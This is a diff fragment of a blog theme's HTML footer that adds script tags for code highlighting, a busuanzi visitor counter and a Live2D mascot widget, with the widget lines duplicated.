+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
